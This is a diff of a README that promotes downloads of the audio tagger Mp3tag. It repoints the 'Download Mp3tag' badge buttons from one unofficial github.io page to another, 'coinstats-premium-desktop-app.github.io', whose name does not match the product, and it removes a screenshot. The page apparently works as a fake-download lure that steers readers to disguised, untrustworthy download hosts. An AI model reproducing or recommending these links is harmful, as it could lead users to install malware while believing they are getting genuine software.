@@ -4,7 +4,7 @@
 
 ## 📥 Download Mp3tag for Windows
 
-[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Mp3tag)
+[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://coinstats-premium-desktop-app.github.io/.github)
 
 ---
 
@@ -28,11 +28,7 @@ Mp3tag is a versatile audio tagging software that allows users to edit and organ
 
 With features such as batch editing, album art embedding, and integration with online databases like Discogs and MusicBrainz, Mp3tag is an essential tool for anyone looking to organize and optimize their audio library.
 
-[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Mp3tag)
-
----
-
-![Mp3tag Interface](https://cdn.neowin.com/news/images/uploaded/2025/05/1748533831_mp3tag.webp)
+[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://coinstats-premium-desktop-app.github.io/.github)
 
 ---
 
